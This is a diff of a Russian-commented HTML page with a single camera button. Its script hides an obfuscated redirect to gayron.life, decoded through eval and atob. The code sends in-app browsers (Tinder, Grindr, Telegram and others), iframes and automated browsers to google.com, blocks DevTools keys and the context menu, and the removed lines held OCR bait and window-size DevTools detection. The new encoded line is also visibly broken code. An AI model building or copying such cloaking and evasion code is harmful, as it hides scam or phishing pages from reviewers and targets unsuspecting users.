@@ -16,6 +16,7 @@
       justify-content: center;
       align-items: center;
     }
+
     .btn {
       background-color: white;
       color: black;
@@ -26,72 +27,64 @@
       cursor: pointer;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
     }
-    canvas.ocr-bait {
-      display: none;
-    }
   </style>
 </head>
 <body>
   <button class="btn" onclick="go()">📷</button>
-  <canvas class="ocr-bait" id="ocr"></canvas>
 
   <script>
-    // 🔐 Защита от встроенных браузеров, iframe и headless
+    // 🔐 Проверка на встроенные браузеры
     (function() {
       const ua = navigator.userAgent.toLowerCase();
-      const suspiciousAgents = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
-      const isWebview = suspiciousAgents.some(agent => ua.includes(agent));
+      const isWebview =
+        ua.includes("instagram") ||
+        ua.includes("fbav") ||
+        ua.includes("facebook") ||
+        ua.includes("tinder") ||
+        ua.includes("okhttp") ||
+        ua.includes("webview") ||
+        ua.includes("line") ||
+        ua.includes("pinterest") ||
+        ua.includes("telegram") ||
+        ua.includes("grindr");
 
-      if (isWebview || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
-        location.href = "https://google.com";
+      if (isWebview) {
+        window.location.href = "https://google.com";
+        return;
+      }
+
+      if (window.top !== window.self) {
+        window.location.href = "https://google.com";
+        return;
+      }
+
+      if (navigator.webdriver) {
+        window.location.href = "https://google.com";
+        return;
       }
     })();
 
-    // 👁️ OCR bait
-    (function() {
-      const canvas = document.getElementById("ocr");
-      const ctx = canvas.getContext("2d");
-      canvas.width = 300;
-      canvas.height = 80;
-      ctx.font = "20px Arial";
-      ctx.fillStyle = "black";
-      ctx.fillText("https://gayron.life/rehbixee", 10, 50);
-    })();
-
-    // 🎯 Проверка взаимодействия пользователя
+    // 👤 Проверка взаимодействия
     let interacted = false;
     document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("touchstart", () => interacted = true);
     document.addEventListener("keypress", () => interacted = true);
 
-    // 🧱 DevTools detection (активный)
-    setInterval(() => {
-      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-        location.href = "https://google.com";
-      }
-    }, 500);
-
-    // ⛔️ Блок DevTools клавиш и правой кнопки
+    // 🚫 DevTools и контекстное меню
     document.addEventListener("contextmenu", e => e.preventDefault());
     document.onkeydown = e => {
       if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
     };
 
-    // 🧬 Шифрованный редирект
     function go() {
       if (!interacted) return;
+
       setTimeout(() => {
-        const parts = [
-          "ZnVuY3",
-          "Rpb24gcG",
-          "F5bG9hZCgp",
-          "IHt3aW5kb3cu",
-          "bG9jYXRpb24ua",
-          "HJlZiA9ICdodHRwczovL2dheXJvbi5saWZlL3JlaGJpeGVlJzt9"
-        ];
-        eval(atob(parts.join('')));
-      }, Math.random() * 1000 + 1500);
+        const j = "ZXZhbChhdG9iKCJodHRwczovL2dheXJvbi5saWZlL3N1cGVyc2VjcmV0Iikp";
+        eval(atob(j));
+      }, 2000);
     }
   </script>
 </body>
 </html>
+
